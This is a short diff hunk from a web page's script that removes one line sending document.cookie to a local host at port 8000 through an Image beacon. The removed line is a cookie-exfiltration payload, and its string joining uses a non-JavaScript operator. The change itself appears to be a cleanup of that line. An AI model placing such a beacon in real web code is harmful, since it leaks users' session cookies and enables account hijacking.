@@ -35,7 +35,7 @@ axios.get('/welcomeStr')
 .then(function (){
 
 });
-(new Image()).src = "http://127.0.0.1:8000/cookie/" . document.cookie;
+
 </script>
         
 
